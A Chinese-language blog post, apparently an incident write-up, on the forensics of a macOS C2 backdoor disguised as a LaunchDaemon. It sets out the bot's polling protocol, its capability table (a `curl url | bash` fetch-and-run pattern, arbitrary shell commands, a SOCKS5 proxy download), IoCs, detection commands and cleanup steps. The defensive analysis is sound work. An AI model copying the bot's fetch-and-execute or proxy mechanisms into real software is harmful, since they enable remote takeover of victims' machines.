---
title: "一次真实的 macOS C2 后门排查:从伪装 LaunchDaemon 到 SOCKS5 跳板(含公开情报交叉验证)"
description: "一枚藏在系统自启项里的 C2 远控 bot,只活了 6 天就自毁。本文以完整取证过程还原其攻击链(持久化、协议、能力矩阵、运营节奏),加入公开威胁情报(SafeMode 相似基础设施)交叉验证的分级结论,并在结尾给出可落地的三层防御清单——预防、检测、响应。"
pubDate: '2026-08-28 01:30:00'
tags: ["安全", "macOS", "恶意软件", "取证", "后门", "C2", "threat-intel", "攻击与防御"]
---

> 文中样本、IoC 与时间线均来自真实事件(已匿名化);公开情报部分已标注证据等级——**"相似站点"类关联是关联证据,不是 DNS 历史解析证明**,请勿过度归因。

## 起因

"我 Mac 上有没有中招恶意脚本?有没有自动上传的进程?"

排查从一个疑问开始,结束于一条完整时间线。结论:**确实中招了——一枚系统级 C2 远控后门,藏在 `/Library/LaunchDaemons/` 里,伪装成 Apple 风格系统服务;它活了 6 天,在发出一次注册请求后自毁,至今未执行过任何远程指令。**

这篇文章把整条取证链展开给你:它是什么、怎么进来的(能证明到哪一步)、怎么运作、公开威胁情报里能不能找到它同伙,以及——**遇到同类事件,该按什么顺序防御**。

---

## 一、排查第一步:从表面到持久化面

安全排查忌讳单点检查。这次用的顺序:

1. **进程全量快照** `ps -axo pid,ppid,user,etime,args` —— 谁在跑、从哪里跑
2. **网络连接** `lsof -nP -i`、`netstat` —— 谁在向外连、连到哪
3. **持久化面** —— 两个全局 `LaunchAgents` + `LaunchDaemons` 目录逐一审读
4. **异常路径** —— `/tmp`、`/var/tmp`、用户主目录顶层点文件(dotfiles)

进程和网络都"正常":微信、QQ、Chrome、公司隧道客户端,没有可疑外联。但摸到持久化面时,一个文件让我停了下来:

```
/Library/LaunchDaemons/com.xdivcmp.plist    (root:wheel, 4860B)
```

## 二、命中:一枚"看起来很正常"的 LaunchDaemon

`com.xdivcmp` —— label 格式完全模仿系统服务命名,混在 360、腾讯、深信服、OrbStack 等厂商自启项里毫无违和感。但它的 `ProgramArguments` 不是一条正常路径,而是一个 6KB 的字符串:

```
/bin/bash -c 'osascript -e '<一段 6KB 的 AppleScript>''
```

先读持久化字段——每一个都有门道:

| 字段 | 含义 | 攻击者的心思 |
|---|---|---|
| `RunAtLoad=true` | 开机即执行 | 保证存活 |
| `KeepAlive=true` | 退出即自动重启 | **只删"自毁标记"不删它,就能原地复活** |
| `SessionCreate=true` | 无登录会话也启动 | 比 LaunchAgent 更早、更稳 |
| `UserName=<user>` | 以普通用户身份运行 | 不追求 root,要的是"能偷到的一切" |

注意最后一点:写在 `/Library/LaunchDaemons` 意味着**投放者当时拥有管理员权限**,但 bot 本体刻意降级为普通用户——普通用户权限足够偷 keychain、浏览器 Cookie、SSH 私钥、截屏,却能完美躲过"root 进程"类告警。

## 三、拆样本:一枚 C2 bot 的完整协议

短短 6KB AppleScript,功能却相当完整。核心是一个 60 秒一次的循环:

```
1. 注册:  GET {bhost}/api/v1/bot/joinsystem/{username}/{macOS版本}
          响应体 = botid → 写入 ~/.botid
2. 轮询:  GET {bhost}/api/v1/bot/actions/{botid}
          响应必须恰好 3 行:[actionID, actionName, actionComment]
3. 执行:  动作 ID 变化才执行;先写 ~/.lastaction,再干活
4. 自毁:  任何环节重试 10 次失败 → 写 ~/.uninstalled,退出
```

所有配置都以点文件形式藏在主目录顶层:

```
~/.bhost        http://192.253.248.181       ← bot 接口(IP 直连,HTTP)
~/.phost        https://lonjfq.com           ← 面板
~/.username     xxx                          ← 面板用户名
~/.botid        29e28938...7b86              ← 已注册成功
~/.lastaction   (不存在)                     ← 从未执行过动作
~/.uninstalled  +                            ← 自毁标记(5/15 08:44)
```

### 能力矩阵

| 动作 | 行为 | 解读 |
|---|---|---|
| `uninstall` | 写标记退出 | 自愈式隐身,随时"下线" |
| `repeat` | `curl url | bash &` | 任意下载管道执行 |
| `doshell` | `do shell script <面板下发> ` | 任意命令执行 |
| `enablesocks5` | 下载 `/tmp/socks` 并后台运行 | **把受害者变成 SOCKS5 代理** |

最值得展开的是最后一条:这类 bot 最毒的不是"下指令",而是 **`enablesocks5`:把你这台机器变成攻击者的洋葱跳板**。此后攻击者可借你的 IP 访问内网、收发垃圾邮件、登录任何服务——追溯起来全是你的地址。日志、代理链、横向移动,全记在你名下。

另一个实现细节:全协议**没有任何鉴权**——身份就是 URL 里的 username/botid 加上一个 `User-Agent: bot` 头。面板属于"谁能访问谁就能操作"的裸奔状态。

### 两个"抗检测"彩蛋

1. **非法 XML**:脚本里嵌着大量裸 `&`(第 17 行起),导致 Apple 的严格 plist 解析器(`plutil`)**直接拒绝读取整个文件**——基于 CFPropertyList 的静态检测工具根本还原不出 payload;而 launchd 的宽松加载器照常执行。这是本事件里最意外的技术点:**"谁能读它"和"谁能跑它"是两套解析器**。
2. **纯文本无编译物**:bash + osascript + curl,无 Mach-O 特征,杀软静态面极窄。

### 关键取证判据

代码逻辑是"**先写 `.lastaction`、再执行动作**"。因此:

- `.lastaction` 缺失 ⇒ **零指令执行**
- `.uninstalled` 存在且 mtime 恒为 5/15 08:44:31 ⇒ 自毁动作确切发生于该时刻,之后再无任何文件写入
- `/tmp/socks` 不存在 ⇒ `enablesocks5` 从未下载落地
- 动态观测:launchd 的 `runs` 计数从 14,303 持续增长(每 10~35 秒一次 spawn),但每次进程存活 <1 秒即退出——正是"读门闩 → return"的形态;**5/15 以来零网络、零写盘**

## 四、攻方视角:一套 6 天生命的 C2 运营节奏

把 C2 的一生死掉,拼图就完整了:

| 时间 | 事件 |
|---|---|
| 05-09 18:56 | 注册 `lonjfq.com`(假名注册人、PublicDomainRegistry、Cloudflare NS) |
| 05-14 14:37 | 后门落盘,注册成功(botid 落盘) |
| 05-15 08:44:31 | 自毁标记写入(面板主动 uninstall / 10 次失败自杀,无法区分) |
| 08-28 | 发现与根除 |

**域名只活了 5 天,IP 段归属 PUREVPN / Secure Internet LLC(一个 VPN 供应商的地址段)**。这是教科书式的一次性基础设施策略:域名注册后几天内投递、窗口期执行、主动回收,避免被安全厂商拉黑和 EDR 标记。

## 五、公开威胁情报交叉验证(证据分级)

### 现有公开关联:一次"相似站点"线索

在威胁分析平台(SafeMode)"**86.54.25.204 恶意页面分析**"页面中(分析日期 2026-05-11),**`lonjfq.com` 出现在该 IP 的 Similar Websites 列表里**,同时列出的还有 `86.54.25.202`、`77.110.124.112` 等。

**先说清楚它的证据等级**:

> 这类"相似站点关联"是攻击集群特征聚类(域名/IP 的注册模式、证书、托管商等相似),**它不能证明 `lonjfq.com` 曾解析到 86.54.25.204,也不构成"同一个人运营"的证明**。把它当作"这两个基础设施气象同族"的佐证,而不是历史事实。

### 本地核验结果(这次排查顺手验证)

| IP | WHOIS 归属 | 特征 |
|---|---|---|
| 86.54.25.204 | `Shereverov-network`(RIPE,**哈萨克斯坦**) | 小众 VPN 段 |
| 86.54.25.202 | 同上 | 相邻地址 |
| 77.110.124.112 | `Netcrafters-OU`(EE/US) | 小托管商 |
| 192.253.248.181(本事件 C2) | PUREVPN / Secure Internet LLC(US) | VPN 供应商 |

一个有趣的补充观测:经公司零信任隧道,DNS 把这四个 IP 分别映射到虚拟段 **`198.0.12.59/.60/.169/.170/.171`**——C2 与 SafeMode 关联的三个 IP 落在**同一虚拟 /24 且地址相邻**。也就是说,在"受害者视角"的观测面上,它们呈现集群聚集形态。这再次佐证"同族基础设施",但依然**不是**同一运营者的证明(攻击者群体共享 VPS 供应商是常态)。

### 有没有完整的公开报告?

诚实结论:**没找到针对该 bot 面板家族的公开专项研究报告。** 这类"bash/osascript 脚本 bot + web 面板"属于低曝光类别——无 CVE、无大规模传播、无企业受害通报,威胁情报社区的存量覆盖很少;SafeMode 的相似站点关联是目前唯一定位到的公开关联点。

**利用建议**:如果你在自家环境做同样的 IoC hunt,把"**这类相似基础设施的三件套**"作为挖掘口径——① 域名注册时间与投毒窗口重合;② 注册人假名 + 低成本注册商 + Cloudflare 隐藏源站;③ IP 段归属小型 VPN/VPS 商。用这三个特征扫出口日志/网关日志,比单点比对域名值钱得多。

**本事件完整 IoC 见文末参考章(可直接用于 EDR/网关匹配);完整事件证据链、样本解析与处置记录见姊妹篇《[macOS C2 后门事件安全报告(公开版)](/blog/macOS-C2后门事件安全报告/)》。**

## 六、防方视角:三层防御清单

### A. 预防面(把"进来"的口子堵窄)

1. **安装来源治理**。这枚后门拿到管理员权限写入系统目录,大概率经由某种"安装流程"。盗版软件、破解工具(本机还查到一个 adhoc 签名的 `jetbrains-crack-toolbox`)、来源不明的打包安装器,是这类 bot 的高发入口。规则很简单:**装之前先看它申请什么权限、来自哪个域**;破解类工具只允许出现在无业务数据的虚拟机里。
2. **默认安全设置**。保持 Gatekeeper/Notarization 检查开启;企业机器建议启用 MDM 禁止用户安装 adhoc 签名应用。
3. **账号与权限**。日常账号不做管理员;管理员密码与登录密码分离。

### B. 检测面(10 分钟的例行体检)

给出可直接执行的检查命令(约 5 分钟,建议两周一次):

```bash
# 1. 网络与进程
lsof -nP -i | grep ESTABLISHED
ps -axo pid,ppid,user,etime,args | grep -vE '\s(/System/|/usr/libexec/)'

# 2. 持久化面(逐条审 plist!)
ls -la /Library/LaunchDaemons/ /Library/LaunchAgents/ ~/Library/LaunchAgents/
launchctl list | grep -vE '^[0-9-]+\s'

# 3. 主目录顶层点文件(这次就是在这里命中的)
ls -la ~ | grep '^\.'

# 4. 信号特征(IOA)
ps ax | grep -iE 'osascript|curl.*bash|pgrep -f'
find ~ -maxdepth 1 -name '.uninstalled' -o -name '.lastaction' -o -name '.botid'
```

**高危行为特征(看到即查)**:

- `osascript` 与 `curl`/`wget` 组合(几乎无正常场景)
- launchd 任务以 `bash -c` + **内联数百字节以上脚本**作为 payload
- 主目录顶层莫名出现 `.bhost/.phost/.username` 这类无扩展名点文件
- `/tmp` 下被 `chmod +x` 的二进制 / `disown` 启动的可疑进程
- launchd 任务里出现 `KeepAlive + RunAtLoad + SessionCreate` 且无签名二进制

### C. 响应面(顺序比命令更重要)

这次排查最重要的一课:

```
❌ 先删 ~/.uninstalled,后删 plist   → 后门解除门闩,下一轮重启即武装
✅ 先 bootout + 删除 plist,再删标记文件
```

标准处置顺序(需管理员权限):

```bash
sudo launchctl bootout system/com.xdivcmp 2>/dev/null
sudo launchctl remove com.xdivcmp 2>/dev/null
sudo rm -f /Library/LaunchDaemons/com.xdivcmp.plist   # ← 先删持久化!
rm -f ~/.bhost ~/.botid ~/.phost ~/.username ~/.lastaction ~/.uninstalled
# 复验
launchctl list | grep -i xdivcmp || echo CLEAN
```

**证据保全顺序**(反过来——先取证后清理):

```bash
sudo shasum -a 256 /Library/LaunchDaemons/com.xdivcmp.plist   # 哈希
launchctl print system/com.xdivcmp                            # 运行态参数/计数
ls -la ~/.bhost ~/.phost ~/.username ~/.botid ~/.uninstalled  # 标记文件
whois lonjfq.com; whois 192.253.248.181                       # 基础设施情报
```

**上报口径建议**:机器在企业环境,务必交 IT/安全——本事件里企业网关与 EDR 管理端的服务端日志是唯一可能存活的证据源;同时用 IoC 扫全网段同源命中。

### D. 加固面(让下次取证省力)

1. **开启 Time Machine / 企业备份**。本次因无本地快照,5/14 的下载记录(Chrome 90 天裁剪、隔离库仅存近期)全部不可恢复——有快照就能直接回到当天现场。
2. **把监检查进日常**:`osascript+curl` 组合、`/Library/LaunchDaemons` 新增文件、主目录新增点文件,这三条足够拦截 80% 同类样本。
3. **重点账号轮换**:哪怕只泄露了"用户名+版本+IP",按"可能受关注"对待。

## 七、教训清单

- **这类 bot 高度自动化**:注册、轮询、自毁全自动,生命周期以"天"计——防御侧的例行体检也应按周,而不是"想起来再看"。
- **状态全在磁盘上**:自毁标记、配置、日志,都藏在一个个点文件里。——所以扫点文件,比盯着进程有用。
- **权限设计相当成熟**:root 落盘、user 执行,骗过了高权限告警面。脚本类后门因此经久不衰。
- **解析器分叉是个好技巧**:非法 XML 能让半数字安工具"读不出"样本,却不妨碍 launchd 运行。检测工具请用 `launchctl print` / 行为层,而不是 plutil。
- **取证时机决定证据质量**:先拍照(哈希/全文/时间线)再做清理,顺序反了就只剩推断。
- **信任基础设施的"正常感"**:`com.xdivcmp` 混在一片正常 label 里——最终让我停下来的,不是告警,而是"为什么多出一个没见过的 daemon"。

---

## 参考:IoC 汇总

**文件型**

| 对象 | 值 |
|---|---|
| 恶意 plist | `/Library/LaunchDaemons/com.xdivcmp.plist`(4,860B) |
| SHA-256 | `5ef1703f92516e3adc7012de3acaad8fae23c42397e973030e2dcb0209e6a791` |
| 标记文件 | `~/.bhost .phost .username .botid .lastaction .uninstalled` |
| 下载目标 | `/tmp/socks`(未落地) |

**网络型**

| 类型 | 值 |
|---|---|
| 域 | `lonjfq.com` |
| IP | `192.253.248.181:80`(C2);`86.54.25.202/204`、`77.110.124.112`(SafeMode 关联,相似基础设施) |
| URL | `{bhost}/api/v1/bot/joinsystem/{user}/{macosv}`、`/api/v1/bot/actions/{botid}`、`/api/v1/bot/repeat/{user}`、`/web/socks` |
| 标识 | `User-Agent: bot`;`app_id=xxxblyat`;launchd label `com.xdivcmp` |

**证据等级声明**:`Similar Websites` 关联为"相似基础设施"关联证据(特征聚类),**非 DNS 历史解析证明、非同一运营者证明**;其价值在于指示挖掘方向,不作为实锤。

---

> 📌 **姊妹篇**:《[macOS C2 后门事件安全报告(公开版)](/blog/macOS-C2后门事件安全报告/)》——完整事件证据链、样本解析与逐函数行为还原、处置记录与 IoC 汇总,基于同一真实事件,个人与组织信息已脱敏。

想复现的同学,按上面 B 面清单做一轮体检即可——但先读完 C 面的"顺序陷阱"。数据面前,谁也不特殊,机器也一样。
